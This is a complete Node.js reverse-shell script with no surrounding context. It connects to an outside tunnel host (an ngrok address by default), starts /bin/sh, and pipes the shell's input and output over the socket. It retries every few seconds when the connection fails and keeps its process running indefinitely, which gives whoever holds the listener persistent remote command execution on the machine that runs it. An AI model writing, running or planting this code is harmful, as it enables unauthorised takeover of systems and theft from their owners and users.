const net = require('net');
const { spawn } = require('child_process');

const LHOST = process.env.LHOST || '6.tcp.ngrok.io';
const LPORT = +(process.env.LPORT || 19385);

function connect() {
  const c = new net.Socket();
  c.connect(LPORT, LHOST, () => {
    const sh = spawn('/bin/sh', []);
    c.write(`Connected to ${LHOST}:${LPORT}\n`);
    c.pipe(sh.stdin);
    sh.stdout.pipe(c);
    sh.stderr.pipe(c);
  });
  c.on('error', () => setTimeout(connect, 3000));
}
connect();

// keep process alive
setInterval(() => {}, 1 << 30);
